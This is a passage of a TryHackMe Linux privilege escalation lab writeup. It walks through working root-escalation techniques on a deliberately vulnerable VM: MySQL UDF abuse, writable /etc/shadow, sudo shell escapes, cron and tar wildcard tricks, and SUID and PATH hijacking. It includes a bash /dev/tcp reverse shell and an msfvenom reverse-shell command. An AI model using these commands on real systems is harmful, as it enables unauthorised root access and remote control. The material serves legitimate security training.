---
title: "Linux PrivEsc Tryhackme Writeup 224b48e7d168"
platform: Medium
original_file: 2024-08-17_Linux-PrivEsc-Tryhackme-Writeup-224b48e7d168.md
---

# Linux PrivEsc Tryhackme Writeup 224b48e7d168

::: {}
# Linux PrivEsc Tryhackme Writeup {#linux-privesc-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/linuxprivesc Note: This room is
Free
:::

::::::: {.section .e-content field="body"}
:::::: {#8208 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Linux PrivEsc Tryhackme Writeup {#b853 .graf .graf--h3 .graf--leading .graf--title name="b853"}

<figure id="25af" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*DqdJln6A9r8ysidRCGIttQ.png"
class="graf-image" data-image-id="1*DqdJln6A9r8ysidRCGIttQ.png"
data-width="2240" data-height="1260" />
</figure>

<figure id="cc1a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*SRt8ERoasydRdePC.png"
class="graf-image" data-image-id="0*SRt8ERoasydRdePC.png"
data-width="488" data-height="247" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/linuxprivesc"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is Free**

### Task 1: Deploy the Vulnerable Debian VM {#f966 .graf .graf--h3 .graf-after--p name="f966"}

This room is aimed at walking you through a variety of Linux Privilege
Escalation techniques. To do this, you must first deploy an
intentionally vulnerable Debian VM. This VM was created by Sagi Shahar
as part of his [**local privilege escalation
workshop**](https://github.com/sagishahar/lpeworkshop){.markup--anchor
.markup--p-anchor data-href="https://github.com/sagishahar/lpeworkshop"
rel="noopener ugc nofollow noopener" target="_blank"} but has been
updated by [Tib3rius](https://twitter.com/TibSec){.markup--anchor
.markup--p-anchor data-href="https://twitter.com/TibSec"
rel="noopener ugc nofollow noopener" target="_blank"} as part of his
[**Linux Privilege Escalation for OSCP and
Beyond!**](https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06){.markup--anchor
.markup--p-anchor
data-href="https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06"
rel="noopener ugc nofollow noopener" target="_blank"} course on Udemy.
Full explanations of the various techniques used in this room are
available there, along with demos and tips for finding privilege
escalations in Linux.

**Make sure you are connected to the** [**TryHackMe
VPN**](https://tryhackme.com/access){.markup--anchor .markup--p-anchor
data-href="https://tryhackme.com/access"
rel="noopener ugc nofollow noopener" target="_blank"} **or using the
in-browser Kali instance before trying to access the Debian VM!**

SSH should be available on port 22. You can login to the "user" account
using the following command:

`ssh user@10.10.25.177`{.markup--code .markup--p-code}

If you see the following message: "Are you sure you want to continue
connecting (yes/no)?" type **yes** and press **Enter**.

The password for the "user" account is "**password321**".

The next tasks will walk you through different privilege escalation
techniques. After each technique, you should have a root shell.
**Remember to exit out of the shell and/or re-establish a session as the
"user" account before starting the next task!**

Deploy the machine and login to the "user" account using SSH.

**Q.1:** Run the "id" command. What is the result?

<figure id="071a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*luDAZU0tEo_ZtCzI.png"
class="graf-image" data-image-id="0*luDAZU0tEo_ZtCzI.png"
data-width="875" data-height="345" />
</figure>

> ***Answer: uid=1000(user) gid=1000(user)
> groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)***

### Task 2: Service Exploits {#be2e .graf .graf--h3 .graf-after--blockquote name="be2e"}

The MySQL service is running as root and the "root" user for the service
does not have a password assigned. We can use a [popular
exploit](https://www.exploit-db.com/exploits/1518){.markup--anchor
.markup--p-anchor data-href="https://www.exploit-db.com/exploits/1518"
rel="noopener ugc nofollow noopener" target="_blank"} that takes
advantage of User Defined Functions (UDFs) to run system commands as
root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:

``` {#0f20 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cd /home/user/tools/mysql-udf
```

Compile the raptor_udf2.c exploit code using the following commands:

<figure id="f917" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ayBF7-zoLDKy9VN9.png"
class="graf-image" data-image-id="0*ayBF7-zoLDKy9VN9.png"
data-width="875" data-height="323" />
</figure>

Connect to the MySQL service as the root user with a blank password:

``` {#3e18 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
mysql -u root
```

<figure id="3da2" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*it8SBd-A5bgPNyMs.png"
class="graf-image" data-image-id="0*it8SBd-A5bgPNyMs.png"
data-width="875" data-height="402" />
</figure>

Execute the following commands on the MySQL shell to create a User
Defined Function (UDF) "do_system" using our compiled exploit:

<figure id="18ce" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*oOrsAPSD7_gvlbIK.png"
class="graf-image" data-image-id="0*oOrsAPSD7_gvlbIK.png"
data-width="717" data-height="179" />
</figure>

<figure id="bb25" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*nKDJ4B8gwUFHCmCL.png"
class="graf-image" data-image-id="0*nKDJ4B8gwUFHCmCL.png"
data-width="875" data-height="401" />
</figure>

<figure id="4255" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*7YiJbxZn32ZjYacF.png"
class="graf-image" data-image-id="0*7YiJbxZn32ZjYacF.png"
data-width="852" data-height="231" />
</figure>

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID
permission:

``` {#3bc2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit out of the MySQL shell (type **exit** or **\\q** and press
**Enter**) and run the /tmp/rootbash executable with -p to gain a shell
running with root privileges:

``` {#723d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/tmp/rootbash -p
```

**Remember to remove the /tmp/rootbash executable and exit out of the
root shell before continuing as you will create this file again later in
the room!**

``` {#1740 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
rm /tmp/rootbash
exit
```

<figure id="cc98" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*VEEKQowijvDLh3F4.png"
class="graf-image" data-image-id="0*VEEKQowijvDLh3F4.png"
data-width="875" data-height="250" />
</figure>

### Task 3: Weak File Permissions-Readable /etc/shadow {#d266 .graf .graf--h3 .graf-after--figure name="d266"}

**Q.1:** **What is the root user's password hash?**

<figure id="bb63" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*htjMnlMEP57uTMhU.png"
class="graf-image" data-image-id="0*htjMnlMEP57uTMhU.png"
data-width="875" data-height="154" />
</figure>

<figure id="bd2e" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Bsd9XhSvJMQAbBE-.png"
class="graf-image" data-image-id="0*Bsd9XhSvJMQAbBE-.png"
data-width="875" data-height="96" />
</figure>

As we can see that hashes of root and user are exposed, which can be
cracked offline!

**Q.2: What hashing algorithm was used to produce the root user's
password hash?**

The format of the password is `$id$salt$hash`{.markup--code
.markup--p-code} with possible values for the id:

- [`$1$`{.markup--code .markup--li-code}: MD5]{#614c}
- [`$2$`{.markup--code .markup--li-code}: Blowfish]{#fe04}
- [`$3$`{.markup--code .markup--li-code}: Blowfish]{#69e4}
- [`$5$`{.markup--code .markup--li-code}: SHA256]{#a7c1}
- [`$6$`{.markup--code .markup--li-code}: SHA512]{#e190}

`$6$`{.markup--code .markup--p-code} is for SHA512. John the Ripper will
give this information.

We can use another tool named "hashid" to determine the hash types.

<figure id="df39" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*8Z0VlpebgxXYivoi.png"
class="graf-image" data-image-id="0*8Z0VlpebgxXYivoi.png"
data-width="875" data-height="150" />
</figure>

**Q.3: What is the root user's password?**

We can use john the ripper to crack the password which also tells us the
hashing algorithm used.

<figure id="d262" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*XaSPYUom0uV_I_Vc.png"
class="graf-image" data-image-id="0*XaSPYUom0uV_I_Vc.png"
data-width="835" data-height="239" />
</figure>

### Task 4: Weak File Permissions -Writable /etc/shadow {#8177 .graf .graf--h3 .graf-after--figure name="8177"}

The /etc/shadow file on the VM is not only world readable, it is also
world writable. This can be abused by changing the hash of root to a new
hash for which we know the plain text password.

"mkpasswd" utility is used to create a new sha-512 password. Replace the
new hash for root using vim.

<figure id="c4b8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*x4uR0zmKRDXQeYj-.png"
class="graf-image" data-image-id="0*x4uR0zmKRDXQeYj-.png"
data-width="875" data-height="274" />
</figure>

SSH to the VM with root user and new password "pass123"

<figure id="8987" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ebFb2bB-m-Rx4rsj.png"
class="graf-image" data-image-id="0*ebFb2bB-m-Rx4rsj.png"
data-width="346" data-height="129" />
</figure>

### Task 5: Weak File Permissions -Writable /etc/passwd {#1ed0 .graf .graf--h3 .graf-after--figure name="1ed0"}

The /etc/passwd file contains information about user accounts. It is
world-readable, but usually only writable by the root user.
Historically, the /etc/passwd file contained user password hashes, and
some versions of Linux will still allow password hashes to be stored
there.

<figure id="6910" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*VH-WaZ1dkC8T9SZj.png"
class="graf-image" data-image-id="0*VH-WaZ1dkC8T9SZj.png"
data-width="875" data-height="338" />
</figure>

### Task 6: Sudo -Shell Escape Sequence {#c69d .graf .graf--h3 .graf-after--figure name="c69d"}

List the programs which sudo allows your user to run:

`sudo -l`{.markup--code .markup--p-code}

Visit GTFOBins
([https://gtfobins.github.io](https://gtfobins.github.io/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/"
rel="noopener ugc nofollow noopener" target="_blank"}) and search for
some of the program names. If the program is listed with "sudo" as a
function, you can use it to elevate privileges, usually via an escape
sequence.

Choose a program from the list and try to gain a root shell, using the
instructions from GTFOBins.

For an extra challenge, try to gain a root shell using all the programs
on the list!

**Remember to exit out of the root shell before continuing!**

How many programs is "user" allowed to run via sudo?

<figure id="1ab4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*DikGOlfgt67JqIr-.png"
class="graf-image" data-image-id="0*DikGOlfgt67JqIr-.png"
data-width="654" data-height="355" />
</figure>

> ***Answer: 11***

**Q.2:** One program on the list doesn't have a shell escape sequence on
GTFOBins. Which is it?

> ***Answer: apache2***

**iftop**
([https://gtfobins.github.io/gtfobins/iftop/](https://gtfobins.github.io/gtfobins/iftop/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/iftop/"
rel="noopener ugc nofollow noopener" target="_blank"})

``` {#5dbe .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
sudo iftop
!/bin/sh
```

copy whole command and paste it

<figure id="7300" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*2Y4gj5BSb1IqoDAq.png"
class="graf-image" data-image-id="0*2Y4gj5BSb1IqoDAq.png"
data-width="353" data-height="171" />
</figure>

**find**
([https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/find/"
rel="noopener ugc nofollow noopener" target="_blank"})

<figure id="30ad" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7jZqOU5Lq6qSxw3B.png"
class="graf-image" data-image-id="0*7jZqOU5Lq6qSxw3B.png"
data-width="529" data-height="111" />
</figure>

**nano**
([https://gtfobins.github.io/gtfobins/nano/](https://gtfobins.github.io/gtfobins/nano/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/nano/"
rel="noopener ugc nofollow noopener" target="_blank"})

``` {#b7bd .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="perl"}
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

<figure id="913f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*2uj1k5u_zwXqPvdI.png"
class="graf-image" data-image-id="0*2uj1k5u_zwXqPvdI.png"
data-width="875" data-height="208" />
</figure>

**vim**
([https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/vim/"
rel="noopener ugc nofollow noopener" target="_blank"})

``` {#5290 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sudo vim -c ':!/bin/bash'
```

<figure id="8a3a" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*vwALPeC2xWjM7m9q.png"
class="graf-image" data-image-id="0*vwALPeC2xWjM7m9q.png"
data-width="432" data-height="121" />
</figure>

**man**
([https://gtfobins.github.io/gtfobins/man/](https://gtfobins.github.io/gtfobins/man/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/man/"
rel="noopener ugc nofollow noopener" target="_blank"})

``` {#a69b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
sudo man man
!/bin/bash
```

<figure id="4038" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Kl2khnEmDsvD-D6v.png"
class="graf-image" data-image-id="0*Kl2khnEmDsvD-D6v.png"
data-width="324" data-height="96" />
</figure>

**awk**
([https://gtfobins.github.io/gtfobins/awk/](https://gtfobins.github.io/gtfobins/awk/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/awk/"
rel="noopener ugc nofollow noopener" target="_blank"})

``` {#ba3d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
sudo awk 'BEGIN {system("/bin/bash")}'
```

<figure id="c70b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*ftNcCruc84pfZKL3.png"
class="graf-image" data-image-id="0*ftNcCruc84pfZKL3.png"
data-width="555" data-height="104" />
</figure>

**less**
([https://gtfobins.github.io/gtfobins/less/](https://gtfobins.github.io/gtfobins/less/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/less/"
rel="noopener ugc nofollow noopener" target="_blank"})

``` {#c95e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
sudo less /etc/profile
!/bin/sh
```

<figure id="b49c" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*N4Hh1hMxCn-4zqA1.png"
class="graf-image" data-image-id="0*N4Hh1hMxCn-4zqA1.png"
data-width="406" data-height="110" />
</figure>

**ftp**
([https://gtfobins.github.io/gtfobins/ftp/](https://gtfobins.github.io/gtfobins/ftp/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/ftp/"
rel="noopener ugc nofollow noopener" target="_blank"})

``` {#43b3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
sudo ftp
!/bin/sh
```

<figure id="d215" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*0X0L9R4V5jU7i1Bv.png"
class="graf-image" data-image-id="0*0X0L9R4V5jU7i1Bv.png"
data-width="289" data-height="124" />
</figure>

**nmap**
([https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/nmap/"
rel="noopener ugc nofollow noopener" target="_blank"})

Nmap 5.00 is installed, it has the interactive mode:

``` {#a43b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
sudo nmap --interactive
nmap> !sh
```

<figure id="0320" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*OMcF2Hxj45v6fhyx.png"
class="graf-image" data-image-id="0*OMcF2Hxj45v6fhyx.png"
data-width="575" data-height="194" />
</figure>

### Task 7: Sudo -Environment Variables {#9a09 .graf .graf--h3 .graf-after--figure name="9a09"}

like the walkthrough says,

> *LD_PRELOAD loads a shared object before any others when a program is
> run*

this means that we can create a shared object (to spawn a shell) and
pass it to this environment variable during the execution of a program
(with sudo for root shell) to execute it before the actual program
invoked

<figure id="50a1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*x6HMcsr-iynQaAA0.png"
class="graf-image" data-image-id="0*x6HMcsr-iynQaAA0.png"
data-width="875" data-height="394" />
</figure>

yes, it works even for other libraries, this is due to nature of the
source code of the exploits

<figure id="739a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SWR6g2rOivbxuWCT.png"
class="graf-image" data-image-id="0*SWR6g2rOivbxuWCT.png"
data-width="875" data-height="150" />
</figure>

to elaborate, the contents of
`/home/user/tools/sudo/preload.c`{.markup--code .markup--p-code} is

<figure id="327c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lqzRlRdLqBNmw2gp.png"
class="graf-image" data-image-id="0*lqzRlRdLqBNmw2gp.png"
data-width="320" data-height="287" />
</figure>

and the contents of `/home/user/tools/sudo/library_path.c`{.markup--code
.markup--p-code} is

<figure id="90df" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*75StOxuEMpaCrXid.png"
class="graf-image" data-image-id="0*75StOxuEMpaCrXid.png"
data-width="529" data-height="287" />
</figure>

basically, these programs run a system call to `/bin/bash`{.markup--code
.markup--p-code} to spawn a shell and since we run it with sudo, we get
a root shell

so this is why the process is independent of the library called

### Task 8: Cron Jobs -File Permissions {#ac70 .graf .graf--h3 .graf-after--p name="ac70"}

so we see that `overwrite.sh`{.markup--code .markup--p-code} gets
executed every minute

oh btw if you have trouble with reading cron job times, visit [crontab
guru](https://crontab.guru/){.markup--anchor .markup--p-anchor
data-href="https://crontab.guru/" rel="noopener ugc nofollow noopener"
target="_blank"}

so now, we can exploit this by writing our code in
`overwrite.sh`{.markup--code .markup--p-code} to connect to our local
machine, spawn a shell and when it gets executed by the root user, we'll
get a shell

in unix systems, opening ports (or sockets? not sure), is done by
accessing the protocol and port in `/dev/`{.markup--code
.markup--p-code} like a file (it is called a file descriptor if i'm
right)

so, our code would be

``` {#3691 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
#!/bin/bash
bash -i >& /dev/tcp/10.2.12.26/4444 0>&1
```

**Explanation:**

- [1st line: shebang to denote interpreter, this case --- bash]{#b5f8}
- [2nd line: `bash -i`{.markup--code .markup--li-code} to open an
  interactive shell, `>& /dev/tcp/10.2.12.26/4444`{.markup--code
  .markup--li-code} to redirect all streams to our local machine and
  `0>&1`{.markup--code .markup--li-code} to redirect **stdin** and
  **stdout** to **stdout**]{#9404}

so, after editing the code in `overwrite.sh`{.markup--code
.markup--p-code}, we listen on our local machine waiting for a shell

<figure id="8b11" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*KJ6C_PIuZJxh6m2O.png"
class="graf-image" data-image-id="0*KJ6C_PIuZJxh6m2O.png"
data-width="875" data-height="450" />
</figure>

<figure id="514e" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*MP74bxwh0pzhMefe.png"
class="graf-image" data-image-id="0*MP74bxwh0pzhMefe.png"
data-width="616" data-height="173" />
</figure>

### Task 9: Cron Jobs -PATH Environment Variable {#f9ff .graf .graf--h3 .graf-after--figure name="f9ff"}

View the contents of the system-wide crontab:

``` {#6b5e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cat /etc/crontab
```

Note that the PATH variable starts with /home/user which is our user's
home directory.

Create a file called overwrite.sh in your home directory with the
following contents:

``` {#8c35 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
#!/bin/bashcp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

``` {#5378 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run (should not take longer than a minute). Run
the /tmp/rootbash command with -p to gain a shell running with root
privileges:

``` {#b26b .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/tmp/rootbash -p
```

Remember to remove the modified code, remove the /tmp/rootbash
executable and exit out of the elevated shell before continuing as you
will create this file again later in the room!

``` {#99ac .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
rm /tmp/rootbash
exit
```

<figure id="d965" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*a9H1tGWIOxqr3SQI.png"
class="graf-image" data-image-id="0*a9H1tGWIOxqr3SQI.png"
data-width="875" data-height="482" />
</figure>

### Task 10: Cron Jobs -Wildcards {#779e .graf .graf--h3 .graf-after--figure name="779e"}

View the contents of the other cron job script:

`cat /usr/local/bin/compress.sh`{.markup--code .markup--p-code}

Note that the tar command is being run with a wildcard (\*) in your home
directory.

Take a look at the GTFOBins page for
[tar](https://gtfobins.github.io/gtfobins/tar/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/gtfobins/tar/"
rel="noopener ugc nofollow noopener" target="_blank"}. Note that tar has
command line options that let you run other commands as part of a
checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary.
Update the LHOST IP address accordingly:

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`{.markup--code
.markup--p-code}

Transfer the shell.elf file to **/home/user/** on the Debian VM (you can
use **scp** or host the file on a webserver on your Kali box and use
**wget**). Make sure the file is executable:

<figure id="c5a1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lze6bw-vuhw55Z0b.png"
class="graf-image" data-image-id="0*lze6bw-vuhw55Z0b.png"
data-width="853" data-height="404" />
</figure>

`chmod +x /home/user/shell.elf`{.markup--code .markup--p-code}

Create these two files in /home/user:

`touch /home/user/--checkpoint=1`{.markup--code .markup--p-code}\
`touch /home/user/--checkpoint-action=exec=shell.elf`{.markup--code
.markup--p-code}

<figure id="598c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0LQE_YUo3v-dnpDA.png"
class="graf-image" data-image-id="0*0LQE_YUo3v-dnpDA.png"
data-width="702" data-height="144" />
</figure>

When the tar command in the cron job runs, the wildcard (\*) will expand
to include these files. Since their filenames are valid tar command line
options, tar will recognize them as such and treat them as command line
options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the
cron job to run (should not take longer than a minute). A root shell
should connect back to your netcat listener.

<figure id="66f2" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*b5ZcDKcduOgPZKNV.png"
class="graf-image" data-image-id="0*b5ZcDKcduOgPZKNV.png"
data-width="638" data-height="222" />
</figure>

`nc -nvlp 4444`{.markup--code .markup--p-code}

**Remember to exit out of the root shell and delete all the files you
created to prevent the cron job from executing again:**

`rm /home/user/shell.elf`{.markup--code .markup--p-code}\
`rm /home/user/--checkpoint=1`{.markup--code .markup--p-code}\
`rm /home/user/--checkpoint-action=exec=shell.elf`{.markup--code
.markup--p-code}

### Task 11: SUID / SGID Executables -Known Exploits {#1e2f .graf .graf--h3 .graf-after--p name="1e2f"}

Find all the SUID/SGID executables on the Debian VM:

``` {#b6e9 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

<figure id="30e9" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*3iwi6gVHMh3xHD-j.png"
class="graf-image" data-image-id="0*3iwi6gVHMh3xHD-j.png"
data-width="875" data-height="572" />
</figure>

Note that /usr/sbin/exim-4.84--3 appears in the results. Try to find a
known exploit for this version of exim. Exploit-DB, Google, and GitHub
are good places to search!

A local privilege escalation exploit matching this version of exim
exactly should be available. A copy can be found on the Debian VM at
/home/user/tools/suid/exim/cve-2016--1531.sh.

Run the exploit script to gain a root shell:

<figure id="2c84" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*w-d7i3YiJeFth65Z.png"
class="graf-image" data-image-id="0*w-d7i3YiJeFth65Z.png"
data-width="650" data-height="121" />
</figure>

### Task 12: SUID / SGID Executables -Shared Object Injection {#d971 .graf .graf--h3 .graf-after--figure name="d971"}

when we run `/usr/local/bin/suid-so`{.markup--code .markup--p-code}
(something to do with shared objects), it shows a progress bar and then
exits

so we run a
`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`{.markup--code
.markup--p-code} to see if there are misconfigurations or files that we
can change to exploit this executable.

from the output, our target is
`/home/user/.config/libcalc.so`{.markup--code .markup--p-code} because
it doesn't exist and we have read-write permissions to manage files and
folders

on compiling and running the exploit, we get root shell access

ote that the executable tries to load the /home/user/.config/libcalc.so
shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:

``` {#b191 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
mkdir /home/user/.config
```

Example shared object code can be found at
/home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile
the code into a shared object at the location the suid-so executable was
looking for it:

``` {#bf9d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

Execute the suid-so executable again, and note that this time, instead
of a progress bar, we get a root shell.

``` {#8316 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/usr/local/bin/suid-so
```

<figure id="1756" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*_28lZbYQfNfLfD96.png"
class="graf-image" data-image-id="0*_28lZbYQfNfLfD96.png"
data-width="875" data-height="511" />
</figure>

### Task 13: SUID / SGID Executables -Environment Variables {#7872 .graf .graf--h3 .graf-after--figure name="7872"}

The /usr/local/bin/suid-env executable can be exploited due to it
inheriting the user's PATH environment variable and attempting to
execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the
apache2 webserver:

``` {#5980 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/usr/local/bin/suid-env
```

Run strings on the file to look for strings of printable characters:

``` {#c4bc .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
strings /usr/local/bin/suid-env
```

One line ("service apache2 start") suggests that the service executable
is being called to start the webserver, however the full path of the
executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an
executable called service. This code simply spawns a Bash shell:

``` {#e068 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gcc -o service /home/user/tools/suid/service.c
```

Prepend the current directory (or where the new service executable is
located) to the PATH variable, and run the suid-env executable to gain a
root shell:

``` {#d5de .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
PATH=.:$PATH /usr/local/bin/suid-env
```

<figure id="5cca" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*or0b8HIfpq9gaHJU.png"
class="graf-image" data-image-id="0*or0b8HIfpq9gaHJU.png"
data-width="716" data-height="452" />
</figure>

<figure id="ca95" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*IRxFgkDir4rZWTMa.png"
class="graf-image" data-image-id="0*IRxFgkDir4rZWTMa.png"
data-width="674" data-height="218" />
</figure>

### Task 14: SUID / SGID Executables -Abusing Shell Features (#1) {#f039 .graf .graf--h3 .graf-after--figure name="f039"}

this was very interesting. so in bash versions less than 4.2--048, we
can define functions that resemble file paths

<figure id="202c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*wFzHo-oSZdCU9McW.png"
class="graf-image" data-image-id="0*wFzHo-oSZdCU9McW.png"
data-width="806" data-height="545" />
</figure>

The /usr/local/bin/suid-env2 executable is identical to
/usr/local/bin/suid-env except that it uses the absolute path of the
service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

``` {#064e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
